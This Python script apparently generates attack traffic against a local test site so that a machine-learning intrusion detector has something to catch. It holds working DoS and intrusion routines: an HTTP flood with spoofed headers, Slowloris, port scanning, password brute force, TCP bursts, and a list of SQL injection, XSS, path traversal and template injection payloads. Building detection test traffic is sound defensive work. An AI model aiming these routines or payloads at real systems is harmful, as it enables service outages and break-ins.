"""
Attack Traffic Simulator
========================
Simulates various attack patterns against the target website (localhost:5000)
to generate suspicious network traffic that the ML model should detect.

Usage:
    python simulate_attack.py              # Run all attack simulations
    python simulate_attack.py --type syn   # Run specific attack type
    python simulate_attack.py --type all   # Run all types

Attack Types:
    flood   - HTTP flood (massive rapid requests)
    slowloris - Slow connection drain
    scan    - Port scanning pattern
    bruteforce - Login brute force
    all     - Run all attack patterns sequentially
"""

import requests
import threading
import time
import random
import string
import socket
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET = "http://localhost:5000"
ENDPOINTS = ["/api/users", "/api/products", "/api/transactions", "/api/health", "/api/search", "/api/login", "/"]


def random_string(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def random_headers():
    """Generate suspicious/randomized HTTP headers."""
    user_agents = [
        "Mozilla/5.0 (compatible; Googlebot/2.1)",
        "sqlmap/1.5.2#stable",
        "nikto/2.1.6",
        "Wget/1.21",
        "python-requests/2.28.0",
        "curl/7.84.0",
        "",  # Empty user agent (suspicious)
    ]
    return {
        "User-Agent": random.choice(user_agents),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "Accept": "*/*",
    }


# ─────────────────────────────────────────────
# Attack 1: HTTP Flood (DDoS-like)
# ─────────────────────────────────────────────
def http_flood(duration=30, threads=50):
    """Simulate an HTTP flood attack — massive parallel requests."""
    print("\n🔴 [ATTACK] HTTP Flood — Sending massive parallel requests...")
    print(f"   Duration: {duration}s | Threads: {threads}")
    
    count = 0
    errors = 0
    start = time.time()
    stop_flag = threading.Event()

    def flood_worker():
        nonlocal count, errors
        session = requests.Session()
        while not stop_flag.is_set():
            try:
                endpoint = random.choice(ENDPOINTS)
                params = {random_string(5): random_string(100) for _ in range(random.randint(1, 5))}
                session.get(
                    f"{TARGET}{endpoint}",
                    params=params,
                    headers=random_headers(),
                    timeout=2,
                )
                count += 1
            except:
                errors += 1
            
    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = [pool.submit(flood_worker) for _ in range(threads)]
        
        while time.time() - start < duration:
            elapsed = time.time() - start
            rate = count / max(elapsed, 0.1)
            print(f"\r   ⚡ Requests: {count:,} | Rate: {rate:.0f} req/s | Errors: {errors} | Time: {elapsed:.0f}s/{duration}s", end="", flush=True)
            time.sleep(0.5)
        
        stop_flag.set()
    
    total_time = time.time() - start
    print(f"\n   ✅ Flood complete: {count:,} requests in {total_time:.1f}s ({count/total_time:.0f} req/s)")
    return count


# ─────────────────────────────────────────────
# Attack 2: Slowloris (slow connection drain)
# ─────────────────────────────────────────────
def slowloris(duration=20, connections=30):
    """Simulate Slowloris attack — keep connections open slowly."""
    print(f"\n🟡 [ATTACK] Slowloris — Holding {connections} slow connections...")
    print(f"   Duration: {duration}s")
    
    sockets_list = []
    
    def create_slow_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect(("127.0.0.1", 5000))
            # Send partial HTTP request (never complete it)
            s.send(f"GET /?{random_string(10)} HTTP/1.1\r\n".encode())
            s.send(f"Host: localhost\r\n".encode())
            s.send(f"User-Agent: {random_string(20)}\r\n".encode())
            # Don't send final \r\n — keep connection hanging
            return s
        except:
            return None

    # Open initial connections
    for _ in range(connections):
        s = create_slow_socket()
        if s:
            sockets_list.append(s)
    
    print(f"   📌 Opened {len(sockets_list)} slow connections")
    
    start = time.time()
    while time.time() - start < duration:
        # Keep connections alive by sending partial data
        for s in list(sockets_list):
            try:
                s.send(f"X-{random_string(5)}: {random_string(10)}\r\n".encode())
            except:
                sockets_list.remove(s)
                new_s = create_slow_socket()
                if new_s:
                    sockets_list.append(new_s)
        
        print(f"\r   🔒 Active slow connections: {len(sockets_list)} | Time: {time.time()-start:.0f}s/{duration}s", end="", flush=True)
        time.sleep(1)
    
    # Close all
    for s in sockets_list:
        try:
            s.close()
        except:
            pass
    
    print(f"\n   ✅ Slowloris complete: held {connections} connections for {duration}s")


# ─────────────────────────────────────────────
# Attack 3: Port Scan Simulation
# ─────────────────────────────────────────────
def port_scan(port_range=(4990, 5020)):
    """Simulate a port scan — rapidly probe many ports."""
    print(f"\n🟠 [ATTACK] Port Scan — Probing ports {port_range[0]}-{port_range[1]}...")
    
    open_ports = []
    closed_ports = []
    
    for port in range(port_range[0], port_range[1] + 1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            result = s.connect_ex(("127.0.0.1", port))
            if result == 0:
                open_ports.append(port)
                # Send probe data on open ports
                try:
                    s.send(b"GET / HTTP/1.0\r\n\r\n")
                    s.recv(1024)
                except:
                    pass
            else:
                closed_ports.append(port)
            s.close()
        except:
            closed_ports.append(port)
        
        print(f"\r   🔍 Scanning port {port}... Open: {len(open_ports)} | Closed: {len(closed_ports)}", end="", flush=True)
    
    print(f"\n   ✅ Port scan complete: {len(open_ports)} open, {len(closed_ports)} closed")
    if open_ports:
        print(f"   📌 Open ports: {open_ports}")


# ─────────────────────────────────────────────
# Attack 4: Brute Force Login
# ─────────────────────────────────────────────
def brute_force(attempts=200):
    """Simulate brute force login — rapid credential stuffing."""
    print(f"\n🔴 [ATTACK] Brute Force Login — {attempts} rapid login attempts...")
    
    count = 0
    start = time.time()
    session = requests.Session()
    
    common_passwords = ["admin", "password", "123456", "root", "test", "admin123", 
                        "letmein", "welcome", "monkey", "dragon", "master", "qwerty"]
    common_users = ["admin", "root", "user", "test", "administrator", "guest"]
    
    for i in range(attempts):
        try:
            username = random.choice(common_users)
            password = random.choice(common_passwords) if random.random() > 0.3 else random_string(8)
            
            # POST login attempt
            session.get(
                f"{TARGET}/api/login",
                params={"username": username, "password": password},
                headers=random_headers(),
                timeout=2,
            )
            count += 1
            
            if i % 20 == 0:
                elapsed = time.time() - start
                rate = count / max(elapsed, 0.1)
                print(f"\r   🔑 Attempts: {count}/{attempts} | Rate: {rate:.0f}/s | User: {username}", end="", flush=True)
        except:
            pass
    
    total = time.time() - start
    print(f"\n   ✅ Brute force complete: {count} attempts in {total:.1f}s ({count/total:.0f} attempts/s)")


# ─────────────────────────────────────────────
# Attack 5: Rapid Burst (SYN-flood-like)
# ─────────────────────────────────────────────
def rapid_burst(bursts=10, connections_per_burst=20):
    """Simulate rapid TCP connection bursts — SYN flood-like pattern."""
    print(f"\n🔴 [ATTACK] Rapid Burst — {bursts} bursts x {connections_per_burst} connections...")
    
    total_connections = 0
    
    for burst_num in range(bursts):
        sockets = []
        for _ in range(connections_per_burst):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect(("127.0.0.1", 5000))
                s.send(b"G")  # Send minimal data (incomplete request)
                sockets.append(s)
                total_connections += 1
            except:
                pass
        
        # Immediately close all connections
        for s in sockets:
            try:
                s.close()
            except:
                pass
        
        print(f"\r   💥 Burst {burst_num+1}/{bursts} | Total connections: {total_connections}", end="", flush=True)
        time.sleep(0.1)
    
    print(f"\n   ✅ Rapid burst complete: {total_connections} connections in {bursts} bursts")


# ─────────────────────────────────────────────
# Attack 6: SQL Injection Probe
# ─────────────────────────────────────────────
def sql_injection(attempts=100):
    """Simulate SQL injection probing — send suspicious payloads."""
    print(f"\n🟠 [ATTACK] SQL Injection Probe — {attempts} injection attempts...")
    
    payloads = [
        "' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT * FROM users--",
        "admin'--", "1' AND 1=1--", "' OR 1=1#", "1'; EXEC xp_cmdshell('dir')--",
        "' UNION ALL SELECT NULL,NULL,NULL--", "1 AND SLEEP(5)--",
        "<script>alert('xss')</script>", "../../etc/passwd", "../../../windows/system32",
        "%00", "%0d%0a", "{{7*7}}", "${7*7}", "{{config}}", 
    ]
    
    session = requests.Session()
    count = 0
    
    for i in range(attempts):
        try:
            payload = random.choice(payloads)
            endpoint = random.choice(["/api/search", "/api/users", "/api/login"])
            
            session.get(
                f"{TARGET}{endpoint}",
                params={"q": payload, "id": payload, "user": payload},
                headers=random_headers(),
                timeout=2,
            )
            count += 1
            
            if i % 20 == 0:
                print(f"\r   💉 Injections sent: {count}/{attempts}", end="", flush=True)
        except:
            pass
        time.sleep(0.05)
    
    print(f"\n   ✅ SQL injection probe complete: {count} payloads sent")


# ─────────────────────────────────────────────
# Main — Orchestrate all attacks
# ─────────────────────────────────────────────
def run_all():
    """Run all attack simulations sequentially."""
    print("=" * 60)
    print("🚨  ATTACK TRAFFIC SIMULATOR")
    print("=" * 60)
    print(f"Target: {TARGET}")
    print(f"Time: {time.strftime('%H:%M:%S')}")
    print("=" * 60)
    
    print("\nPhase 1/6: HTTP Flood")
    http_flood(duration=15, threads=30)
    time.sleep(2)
    
    print("\nPhase 2/6: Brute Force Login")
    brute_force(attempts=150)
    time.sleep(2)
    
    print("\nPhase 3/6: SQL Injection Probe")
    sql_injection(attempts=80)
    time.sleep(2)
    
    print("\nPhase 4/6: Rapid TCP Burst")
    rapid_burst(bursts=8, connections_per_burst=15)
    time.sleep(2)
    
    print("\nPhase 5/6: Port Scan")
    port_scan(port_range=(4995, 5010))
    time.sleep(2)
    
    print("\nPhase 6/6: Slowloris")
    slowloris(duration=10, connections=20)
    
    print("\n" + "=" * 60)
    print("✅ ALL ATTACKS COMPLETE")
    print("🖥️  Check the CyberGuard dashboard at http://localhost:3000")
    print("=" * 60)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Attack Traffic Simulator")
    parser.add_argument("--type", default="all", choices=["flood", "slowloris", "scan", "bruteforce", "burst", "sqli", "all"],
                        help="Type of attack to simulate")
    args = parser.parse_args()
    
    print(f"🎯 Target: {TARGET}")
    print(f"🕐 Starting at {time.strftime('%H:%M:%S')}\n")
    
    attacks = {
        "flood": lambda: http_flood(duration=20, threads=40),
        "slowloris": lambda: slowloris(duration=15, connections=25),
        "scan": lambda: port_scan(),
        "bruteforce": lambda: brute_force(attempts=200),
        "burst": lambda: rapid_burst(bursts=10, connections_per_burst=20),
        "sqli": lambda: sql_injection(attempts=100),
        "all": run_all,
    }
    
    try:
        attacks[args.type]()
    except KeyboardInterrupt:
        print("\n\n⛔ Attack simulation stopped by user")
